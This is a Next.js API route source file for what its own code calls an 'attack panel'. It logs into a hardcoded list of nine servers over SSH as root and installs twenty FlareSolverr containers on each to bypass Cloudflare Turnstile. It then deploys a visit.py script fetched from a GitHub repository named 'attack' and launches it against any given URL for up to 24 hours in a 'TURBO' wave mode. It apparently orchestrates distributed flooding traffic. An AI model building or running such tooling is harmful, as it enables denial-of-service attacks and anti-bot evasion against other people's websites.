import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const DEFAULT_SERVERS = [
  { host: '138.68.141.40', username: 'root' },
  { host: '144.126.234.13', username: 'root' },
  { host: '46.101.52.177', username: 'root' },
  { host: '142.93.41.217', username: 'root' },
  { host: '167.99.94.250', username: 'root' },
  { host: '165.22.118.138', username: 'root' },
  { host: '167.71.135.147', username: 'root' },
  { host: '138.68.141.255', username: 'root' },
  { host: '206.189.21.125', username: 'root' }
];

// New setup: Docker + 20 FlareSolverr instances (bypasses CF Turnstile)
const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && (which docker > /dev/null 2>&1 || (curl -fsSL https://get.docker.com | sh)) && docker pull ghcr.io/flaresolverr/flaresolverr:latest && for i in $(seq 1 20); do n=flaresolverr$i; p=$((8190+i)); docker rm -f $n 2>/dev/null; docker run -d --name $n --restart=always -p $p:8191 -e LOG_LEVEL=info --memory=256m ghcr.io/flaresolverr/flaresolverr:latest; done && pip3 install requests --break-system-packages -q 2>/dev/null; pip3 install requests -q 2>/dev/null; sleep 15 && echo SETUP_COMPLETE_20_INSTANCES';

// Sanitize URL to prevent command injection
function sanitizeUrl(url) {
  if (!url || typeof url !== 'string') return null;
  // Only allow http/https URLs
  if (!/^https?:\/\//i.test(url)) return null;
  // Remove dangerous shell characters
  if (/[;&|`$(){}!#\n\r\\]/.test(url)) return null;
  // Remove quotes
  if (/['"]/.test(url)) return null;
  return url.trim();
}

// Sanitize number input
function sanitizeNumber(val, defaultVal, min, max) {
  const num = parseInt(val);
  if (isNaN(num) || num < min || num > max) return defaultVal;
  return num;
}

// Validate API key
function validateApiKey(req) {
  const authHeader = req.headers.get('x-api-key') || '';
  const validKey = process.env.PANEL_API_KEY;
  if (!validKey || authHeader !== validKey) {
    return false;
  }
  return true;
}

async function runSSHCommand(server, command, timeout = 8000) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let resolved = false;

    const done = (result) => {
      if (!resolved) {
        resolved = true;
        try { conn.end(); } catch(e) {}
        resolve(result);
      }
    };

    const timer = setTimeout(() => {
      done({ status: 'success', output: output.trim() || 'Command sent (timeout)' });
    }, timeout);

    conn.on('ready', () => {
      conn.exec(command, { pty: false }, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          return done({ status: 'error', error: err.message });
        }

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          // ignore stderr
        });

        stream.on('close', () => {
          clearTimeout(timer);
          done({ status: 'success', output: output.trim() || 'Done' });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      done({ status: 'error', error: err.message });
    });

    conn.connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
      keepaliveInterval: 3000,
    });
  });
}

export async function POST(req) {
  // Authentication check
  if (!validateApiKey(req)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  try {
    const { action, url, durationMin, visitors, duration, servers, proxies, captchaApiKey } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    if (action === 'setup') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started"`, 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy') {
      // Fetch latest visit.py from GitHub
      let scriptB64;
      try {
        const ghResp = await fetch('https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py', {
          headers: { 'User-Agent': 'attack-panel' }
        });
        if (!ghResp.ok) throw new Error(`GitHub returned ${ghResp.status}`);
        const scriptContent = await ghResp.text();
        scriptB64 = Buffer.from(scriptContent).toString('base64');
      } catch(e) {
        return NextResponse.json({ error: 'Could not fetch visit.py from GitHub: ' + e.message }, { status: 500 });
      }
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"`;
          const r = await runSSHCommand(server, deployCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start') {
      // Sanitize URL to prevent command injection
      const safeUrl = sanitizeUrl(url);
      if (!safeUrl) return NextResponse.json({ error: "Invalid URL - must be http/https and contain no special characters" }, { status: 400 });
      
      // Wave mode: duration in minutes, each server runs independently
      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440); // max 24 hours

      const results = await Promise.all(
        serverList.map(async (server) => {
          // Use single quotes around URL to prevent shell interpretation, and escape any single quotes in URL
          const escapedUrl = safeUrl.replace(/'/g, "'\\''");
          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; for i in $(seq 1 20); do docker start flaresolverr$i 2>/dev/null; done; sleep 2; nohup python3 /root/visit.py '${escapedUrl}' ${safeDuration} > /root/visit.log 2>&1 & echo "Started PID=$! - ${safeDuration} min WAVE mode (TURBO v9 - 20 instances)"`;
          
          const r = await runSSHCommand(server, fullCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'status') {
      // Check status of visits on all servers
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"; curl -s http://localhost:8191/ 2>/dev/null | grep -q FlareSolverr && echo "FLARE_OK" || echo "FLARE_DOWN"', 10000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else {
      return NextResponse.json({ error: "Unknown action" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
